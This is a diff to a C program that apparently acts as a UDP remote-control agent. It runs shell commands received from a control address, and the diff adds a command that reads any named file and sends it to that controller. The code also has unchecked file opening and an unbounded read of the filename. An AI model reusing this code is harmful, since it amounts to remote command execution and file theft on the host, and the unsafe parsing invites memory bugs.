@@ -10,12 +10,12 @@
 #include <pthread.h>
 
 #define PORT    1235
-#define LENGTH  512
+#define LENGTH  1518
 struct sockaddr_in control_add;
 struct sockaddr_in remote_add;
 static int run = 1;
 int sockfd;
-int length = LENGTH;
+int length = sizeof(struct sockaddr_in);
 char datagram[LENGTH];
 
 void printError(int sort, char *err) {
@@ -57,9 +57,10 @@ void sendOnline() {
 }
 
 int main(int argc, char const *argv[]) {
-    int x, z, ret;
+    int x, z, ret, filelen;
     char *control_ip = "127.0.0.1";
-    char command[16], path[128];
+    char command[16], path[128], filename[256];
+	char endcmd[10] = "___EOF___\n";
     pthread_t thread;
 
     FILE *fp;  // It will open a stream for the output of command
@@ -119,7 +120,33 @@ int main(int argc, char const *argv[]) {
         // Transfer file to the control machine
         else if (strcmp(command, "tran") == 0) {
             bzero(command, sizeof(command));
-            // ...
+            sscanf(datagram, "%*5s%s", filename);
+            fp = fopen(filename, "r");
+            fseek(fp, 0, SEEK_END);
+            filelen = ftell(fp);
+            rewind(fp);
+            while(1){
+                bzero(datagram, LENGTH);
+                fread(datagram, LENGTH, 1, fp);
+                if(filelen >= LENGTH){
+                    x = sendto(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
+                    if (x == -1) {
+                        printf("ERR_sendto: %s\n", strerror(errno));
+                        break;
+                    }
+                    filelen -= x;
+                }else{
+                    x = sendto(sockfd, datagram, filelen, 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
+                    if (x == -1) {
+                        printf("ERR_sendto: %s\n", strerror(errno));
+                        break;
+                    }
+                    x = sendto(sockfd, endcmd, strlen(endcmd), 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
+                    break;
+                }
+            }
+            fclose(fp);
+            continue;
         }else {
             datagram[strlen(datagram) - 1] = 0;
             strcat(datagram, " 2>&1\n");  // Redirect the output
